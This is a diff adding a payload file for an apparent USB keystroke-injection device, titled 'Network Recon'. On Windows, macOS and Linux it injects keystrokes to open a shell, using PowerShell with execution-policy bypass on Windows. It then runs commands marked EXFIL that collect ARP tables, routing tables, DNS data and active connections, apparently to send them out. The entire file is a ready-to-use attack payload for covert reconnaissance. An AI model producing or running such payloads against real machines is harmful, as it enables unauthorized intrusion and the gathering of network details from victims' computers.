@@ -1,0 +1,26 @@
+NAME Network Recon
+DESCRIPTION Dumps ARP table, routing table, DNS config, and active connections
+CATEGORY recon
+PLATFORMS WIN,MAC,LINUX
+OPTION DELAY 2000 "Initial HID enumeration delay (ms)"
+PLATFORM WIN
+DELAY {{DELAY}}
+GUI r
+DELAY 800
+STRING powershell -nop -ep bypass
+ENTER
+DELAY 1200
+EXFIL echo '=== ARP ===' ; arp -a ; echo '=== ROUTE ===' ; route print ; echo '=== DNS ===' ; ipconfig /displaydns | Select-String 'Record Name' | Select -First 20 ; echo '=== CONNECTIONS ===' ; netstat -an | Select-Object -First 30
+PLATFORM MAC
+DELAY {{DELAY}}
+GUI SPACE
+DELAY 700
+STRING Terminal
+ENTER
+DELAY 1400
+EXFIL echo '=== ARP ===' && arp -a && echo '=== ROUTE ===' && netstat -rn && echo '=== CONNECTIONS ===' && netstat -an | head -30
+PLATFORM LINUX
+DELAY {{DELAY}}
+CTRL ALT t
+DELAY 1400
+EXFIL echo '=== ARP ===' && arp -a && echo '=== ROUTE ===' && ip route && echo '=== DNS ===' && cat /etc/resolv.conf && echo '=== CONNECTIONS ===' && ss -tuln | head -30
